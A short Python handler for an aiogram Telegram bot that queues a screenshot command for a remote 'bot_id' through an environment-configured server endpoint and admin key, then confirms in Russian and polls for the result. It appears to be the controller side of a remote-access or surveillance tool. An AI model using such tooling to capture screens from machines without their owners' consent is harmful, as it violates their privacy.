import os
import aiohttp
from aiogram.types import ReplyKeyboardRemove
from Commands import CheckForScreenshot


async def get_screenshot(user_data, bot, message):
    async with aiohttp.ClientSession() as session:
        await session.post(os.environ['url_add_command'],
                           data={"bot_id": user_data["bot_id"],
                                 "command": user_data["command"],
                                 "key": os.environ['adm_key']})

    await bot.send_message(message.from_user.id, "Команда на получение скриншота успешно отправлена!",
                           reply_markup=ReplyKeyboardRemove())

    await CheckForScreenshot.check_for_screenshot(user_data, bot, message)
